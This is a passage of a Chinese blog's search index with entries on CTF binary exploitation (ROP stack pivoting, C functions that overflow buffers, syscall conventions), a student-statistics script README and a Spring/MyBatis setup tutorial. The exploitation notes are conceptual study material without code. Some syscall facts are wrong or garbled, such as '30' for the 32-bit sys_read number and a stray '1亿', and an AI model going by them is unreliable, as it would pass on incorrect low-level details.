ebp;ret | pop ebx;ret</strong> 来调整EBP寄存器</li><li>通过 <strong>leave ret;</strong> 来更改 <strong>ESP</strong>,使其指向伪造的栈</li><li>然后在伪造的栈中执行下一段ROP</li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> PWN CTF </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>PWN-常见危险函数</title>
      <link href="/2020/12/12/PWN-%E5%B8%B8%E8%A7%81%E5%8D%B1%E9%99%A9%E5%87%BD%E6%95%B0/"/>
      <url>/2020/12/12/PWN-%E5%B8%B8%E8%A7%81%E5%8D%B1%E9%99%A9%E5%87%BD%E6%95%B0/</url>
      
        <content type="html"><![CDATA[<h1 id="CTF-PWN"><a href="#CTF-PWN" class="headerlink" title="CTF-PWN"></a>CTF-PWN</h1><h2 id="常见的危险函数"><a href="#常见的危险函数" class="headerlink" title="常见的危险函数"></a>常见的危险函数</h2><ul><li><p>gets() 没有检查边界</p><ul><li>通过计算函数的偏移量,通过构造payload达到溢出</li></ul></li><li><p>fgets(buf, 40, stdin)</p><ul><li>能够接受39Byte,最后一个字节为NULL</li><li>如果buf的长度没有39也可以造成溢出</li></ul></li><li><p>read(stdin, buf, 40)</p><ul><li>从输入中读取40个Byte,到buf,最后的字节可以不是NULL</li><li><p>可能会造成信息的泄漏</p></li><li><p>read(0,buf,0x20) 从用户输入读取32个字符</p></li></ul></li><li><p>Write(int fd, buf, nbytes)</p><ul><li>fd 输出描述 1</li><li>buf 为要写入到数据的缓冲区地址</li><li>nbytes为要写入的数据的字节数</li></ul></li><li><p>strcpy</p></li><li><p>memcpy</p></li><li><p>scanf（“%s”，buff）</p></li><li><p>syscall系统调用</p><ul><li><p>操作系统实现系统调用的基本过程是:</p><ul><li>应用程序调用库函数(API)</li><li>API将系统调用号存入EAX,然后通过中断调用使系统进入内核态</li><li>内核中终端处理函数根据系统调用号,调用对应的内核函数(系统调用)</li><li>系统调用完成相应的功能,将返回值存入EAX,返回到中断处理函数</li><li>中断处理函数返回到API中</li><li>API将EAX返回给应用程序</li></ul></li><li><p>应用程序调用系统调用的过程</p><ul><li>把系统调用的编号存入EAX</li><li>把函数参数存入其他通用寄存器</li><li>触发0x80号中断(int 0x80)</li></ul></li><li><p>以上是32位的系统调用,与64 位的区别是</p><ul><li><p>传参方式不同</p><ul><li>32位<ul><li>先将系统调用号传入eax,然后将参数从左到右依次存入ebx,ecx,edx寄存器中,返回值存在eax中</li></ul></li><li>64位<ul><li>先将系统调用号传入rax,然后传参数 从左到右依次存入rdi,rsi,rdx寄存器中,返回值存在rax寄存器</li></ul></li></ul></li><li><p>系统调用号不同</p><ul><li>32位<ul><li>sys_read 的系统调用号为 30 sys_write 的系统调用号为4</li></ul></li><li>64位<ul><li>sys_read的调用号位0,sys_write的调用号为1亿</li></ul></li></ul></li><li><p>调用方式不同</p><ul><li>​    32位<ul><li>使用int 80 中断进行系统调用</li></ul></li><li>64位<ul><li>使用syscall进行系统调用</li></ul></li></ul></li></ul></li></ul></li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> PWN CTF </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>东南大学无锡分校青年大学习统计</title>
      <link href="/2020/10/21/%E4%B8%9C%E5%8D%97%E5%A4%A7%E5%AD%A6%E9%9D%92%E5%B9%B4%E5%A4%A7%E5%AD%A6%E4%B9%A0%E7%BB%9F%E8%AE%A1/"/>
      <url>/2020/10/21/%E4%B8%9C%E5%8D%97%E5%A4%A7%E5%AD%A6%E9%9D%92%E5%B9%B4%E5%A4%A7%E5%AD%A6%E4%B9%A0%E7%BB%9F%E8%AE%A1/</url>
      
        <content type="html"><![CDATA[<h1 id="东南大学青年大学习统计"><a href="#东南大学青年大学习统计" class="headerlink" title="东南大学青年大学习统计"></a>东南大学青年大学习统计</h1><h2 id="运行截图"><a href="#运行截图" class="headerlink" title="运行截图"></a>运行截图</h2><p><img src="/2020/10/21/东南大学青年大学习统计/1.png" alt="image.png"></p><h2 id="环境安装"><a href="#环境安装" class="headerlink" title="环境安装"></a>环境安装</h2><ul><li><p>你可以按照下面的方式下载代码到本地</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> --depth 1 https://github.com/huzai9527/studyAnalysis.git SUSmember-dev</span><br></pre></td></tr></table></figure></li><li><p>本项目在<strong>python 3</strong> 下运行,并且依赖<strong>pands</strong>,你可以在终端运行以下命令进行安装</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install pandas</span><br></pre></td></tr></table></figure></li></ul><h2 id="所需要的文件以及格式"><a href="#所需要的文件以及格式" class="headerlink" title="所需要的文件以及格式"></a>所需要的文件以及格式</h2><ul><li>本院总名单,按照如下格式,首行为班级名称,首列为索引号(excel自带),将班级同学名字替换即可<br><img src="/2020/10/21/东南大学青年大学习统计/2.png" alt="image.png"></li><li>班级累计分数:首行为列名第一列列名空,第二列列名累计分数</li><li>第一列为填班级名,第二列为保存的班级名<br><img src="/2020/10/21/东南大学青年大学习统计/3.png" alt="image.png"></li><li>最后是大学习的统计情况,此文件是上级下发的,只要移到此目录即可<br><img src="/2020/10/21/东南大学青年大学习统计/4.png" alt="image.png"></li><li><p><strong>注:</strong> 总名单以及班级累计分数可以在下载好的文件中直接修改</p><h2 id="安装好环境以及准备好相应文件后-在终端运行-文件目录路径下"><a href="#安装好环境以及准备好相应文件后-在终端运行-文件目录路径下" class="headerlink" title="安装好环境以及准备好相应文件后,在终端运行(文件目录路径下)"></a>安装好环境以及准备好相应文件后,在终端运行(文件目录路径下)</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python SUSmember.py 无锡分校-东南-第十一期</span><br></pre></td></tr></table></figure></li><li><p>运行完成输出，各班详细情况，并在结果文件夹生成EXCELL统计文件<br><img src="/2020/10/21/东南大学青年大学习统计/5.png" alt="image.png"></p></li></ul><h2 id="有不是团员的只要在总名单中删除即可"><a href="#有不是团员的只要在总名单中删除即可" class="headerlink" title="有不是团员的只要在总名单中删除即可"></a>有不是团员的只要在总名单中删除即可</h2>]]></content>
      
      
      
        <tags>
            
            <tag> 数据分析 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>SSM框架整合</title>
      <link href="/2020/10/17/SSM%E6%A1%86%E6%9E%B6%E6%95%B4%E5%90%88/"/>
      <url>/2020/10/17/SSM%E6%A1%86%E6%9E%B6%E6%95%B4%E5%90%88/</url>
      
        <content type="html"><![CDATA[<h1 id="SSM框架整合"><a href="#SSM框架整合" class="headerlink" title="SSM框架整合"></a>SSM框架整合</h1><h2 id="导入相关的依赖"><a href="#导入相关的依赖" class="headerlink" title="导入相关的依赖"></a>导入相关的依赖</h2><ul><li><p>pom.xml</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">project</span> <span class="attr">xmlns</span>=<span class="string">"http://maven.apache.org/POM/4.0.0"</span></span></span><br><span class="line"><span class="tag">         <span class="attr">xmlns:xsi</span>=<span class="string">"http://www.w3.org/2001/XMLSchema-instance"</span></span></span><br><span class="line"><span class="tag">         <span class="attr">xsi:schemaLocation</span>=<span class="string">"http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">modelVersion</span>&gt;</span>4.0.0<span class="tag">&lt;/<span class="name">modelVersion</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.example<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>ssmBuild<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.0-SNAPSHOT<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--        mybatis--&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.mybatis<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>mybatis<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.5.5<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.mybatis<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>mybatis-spring<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.0.5<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--        数据库驱动--&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>mysql<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>mysql-connector-java<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>5.1.49<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--        数据库连接池--&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.mchange<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>c3p0<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>0.9.5.5<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--        spring--&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-webmvc<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>5.2.0.RELEASE<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-jdbc<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>5.2.0.RELEASE<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.aspectj<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>aspectjweaver<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.9.6<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>javax.servlet<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>jstl<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.2<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.projectlombok<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>lombok<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.18.12<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--        junit--&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>junit<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>junit<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>4.13<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">scope</span>&gt;</span>test<span class="tag">&lt;/<span class="name">scope</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">build</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">resources</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">resource</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">directory</span>&gt;</span>src/main/java<span class="tag">&lt;/<span class="name">directory</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">includes</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">include</span>&gt;</span>**/*.properties<span class="tag">&lt;/<span class="name">include</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">include</span>&gt;</span>**/*.xml<span class="tag">&lt;/<span class="name">include</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">includes</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">resource</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">resource</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">directory</span>&gt;</span>src/main/resource<span class="tag">&lt;/<span class="name">directory</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">includes</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">include</span>&gt;</span>**/*.properties<span class="tag">&lt;/<span class="name">include</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">include</span>&gt;</span>**/*.xml<span class="tag">&lt;/<span class="name">include</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">includes</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">resource</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">resources</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">build</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">project</span>&gt;</span></span><br></pre></td></tr></table></figure></li></ul><h2 id="整合mybatis"><a href="#整合mybatis" class="headerlink" title="整合mybatis"></a>整合mybatis</h2><ul><li><p>db.properties</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">jdbc.driver=com.mysql.jdbc.Driver</span><br><span class="line">jdbc.username=root</span><br><span class="line">jdbc.password=asdqwe123.</span><br><span class="line">jdbc.url=jdbc:mysql://localhost:3306/ssmbuild?useUnicode=true&amp;characterEncoding=utf8</span><br></pre></td></tr></table></figure></li></ul><ul><li><p>Mybatis-config.xml</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="UTF-8" ?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE configuration</span></span><br><span class="line"><span class="meta">        PUBLIC "-//mybatis.org//DTD Config 3.0//EN"</span></span><br><span class="line"><span class="meta">        "http://mybatis.org/dtd/mybatis-3-config.dtd"&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">configuration</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--配置数据源，spring代理了--&gt;</span></span><br><span class="line"><span class="comment">&lt;!--    配置别名--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">typeAliases</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">package</span> <span class="attr">name</span>=<span class="string">"com.huzai.pojo"</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">typeAliases</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--    mapper扫描--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">mappers</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">package</span> <span class="attr">name</span>=<span class="string">"com.huzai.dao"</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">mappers</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">configuration</span>&gt;</span></span><br></pre></td></tr></table></figure></li></ul><ul><li><p>Spring-dao.xml</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">beans</span> <span class="attr">xmlns</span>=<span class="string">"http://www.springframework.org/schema/beans"</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xmlns:xsi</span>=<span class="string">"http://www.w3.org/2001/XMLSchema-instance"</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xmlns:context</span>=<span class="string">"http://www.springframework.org/schema/context"</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xsi:schemaLocation</span>=<span class="string">"http://www.springframework.org/schema/beans</span></span></span><br><span class="line"><span class="tag"><span class="string">        https://www.springframework.org/schema/beans/spring-beans.xsd</span></span></span><br><span class="line"><span class="tag"><span class="string">        http://www.springframework.org/schema/context</span></span></span><br><span class="line"><span class="tag"><span class="string">        https://www.springframework.org/schema/context/spring-context.xsd"</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--   关联数据库配置文件--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">context:property-placeholder</span> <span class="attr">location</span>=<span class="string">"classpath:db.properties"</span>/&gt;</span></span><br><span class="line"><span class="comment">&lt;!--    连接池--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">"dataSource"</span> <span class="attr">class</span>=<span class="string">"com.mchange.v2.c3p0.ComboPooledDataSource"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"driverClass"</span> <span class="attr">value</span>=<span class="string">"$&#123;jdbc.driver&#125;"</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"user"</span> <span class="attr">value</span>=<span class="string">"$&#123;jdbc.username&#125;"</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"password"</span> <span class="attr">value</span>=<span class="string">"$&#123;jdbc.password&#125;"</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"jdbcUrl"</span> <span class="attr">value</span>=<span class="string">"$&#123;jdbc.url&#125;"</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"maxPoolSize"</span> <span class="attr">value</span>=<span class="string">"30"</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"minPoolSize"</span> <span class="attr">value</span>=<span class="string">"10"</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"checkoutTimeout"</span> <span class="attr">value</span>=<span class="string">"10000"</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"autoCommitOnClose"</span> <span class="attr">value</span>=<span class="string">"false"</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"acquireRetryAttempts"</span> <span class="attr">value</span>=<span class="string">"2"</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--    sqlSessionFactory--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">"sqlSessionFactory"</span> <span class="attr">class</span>=<span class="string">"org.mybatis.spring.SqlSessionFactoryBean"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"dataSource"</span> <span class="attr">ref</span>=<span class="string">"dataSource"</span>/&gt;</span></span><br><span class="line"><span class="comment">&lt;!--        绑定mybatis配置文件--&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"configLocation"</span> <span class="attr">value</span>=<span class="string">"classpath:mybatis-config.xml"</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--    配置dao接口扫描包，动态实现dao接口注入spring容器中--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">"mapperScannerConfigurer"</span> <span class="attr">class</span>=<span class="string">"org.mybatis.spring.mapper.MapperScannerConfigurer"</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--        注入sqlSessionFactory--&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"sqlSessionFactoryBeanName"</span> <span class="attr">value</span>=<span class="string">"sqlSessionFactory"</span>/&gt;</span></span><br><span class="line"><span class="comment">&lt;!--        需要扫描的dao包--&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"basePackage"</span> <span class="attr">value</span>=<span class="string">"com.huzai.dao"</span>/&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">beans</span>&gt;</span></span><br></pre></td></tr></table></figure></li></ul><h2 id="整合spring"><a href="#整合spring" class="headerlink" title="整合spring"></a>整合spring</h2><ul><li><p>spring-service.xml</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">beans</span> <span class="attr">xmlns</span>=<span class="string">"http://www.springframework.org/schema/beans"</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xmlns:xsi</span>=<span class="string">"http://www.w3.org/2001/XMLSchema-instance"</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xmlns:context</span>=<span class="string">"http://www.springframework.org/schema/context"</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xsi:schemaLocation</span>=<span class="string">"http://www.springframework.org/schema/beans</span></span></span><br><span class="line"><span class="tag"><span class="string">        https://www.springframework.org/schema/beans/spring-beans.xsd</span></span></span><br><span class="line"><span class="tag"><span class="string">        http://www.springframework.org/schema/context</span></span></span><br><span class="line"><span class="tag"><span class="string">        https://www.springframework.org/schema/context/spring-context.xsd"</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--    要扫描的service下的包--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">context:component-scan</span> <span class="attr">base-package</span>=<span class="string">"com.huzai.service"</span>/&gt;</span></span><br><span class="line"><span class="comment">&lt;!--    将所有的业务类，注入到spring容器中，可以配置实现，也可以注解实现--&gt;</span></span><br><span class="line"><span class="comment">&lt;!--    &lt;bean id="bookServiceImpl" 